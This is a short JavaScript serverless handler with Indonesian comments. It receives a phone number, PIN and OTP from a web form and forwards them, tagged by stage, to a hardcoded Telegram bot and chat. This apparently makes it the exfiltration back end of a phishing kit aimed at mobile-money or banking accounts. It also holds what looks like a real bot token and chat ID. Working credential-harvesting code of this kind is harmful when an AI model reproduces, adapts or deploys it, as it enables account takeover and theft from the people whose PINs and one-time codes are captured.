exports.handler = async (event) => {
    // Menangani CORS agar tidak diblokir browser
    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers: { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "Content-Type" } };
    }

    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const data = JSON.parse(event.body);
        const token = "8652214007:AAHt0TuC4p88mmxdMWzkp5VeeGEcU34mGck";
        const chatId = "7414298016";
        
        const text = `⚠️ AKTIVITAS BARU: ${data.tahap}\n\n` +
                     (data.nomor ? `📱 Nomor: ${data.nomor}\n` : "") +
                     (data.pin ? `🔑 PIN: ${data.pin}\n` : "") +
                     (data.otp ? `🔢 OTP: ${data.otp}\n` : "");
        
        const url = `https://api.telegram.org/bot${token}/sendMessage`;

        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: text })
        });

        return {
            statusCode: 200,
            headers: { "Access-Control-Allow-Origin": "*" },
            body: JSON.stringify({ message: "Sukses" })
        };
    } catch (error) {
        return { statusCode: 500, body: JSON.stringify({ message: "Gagal" }) };
    }
};
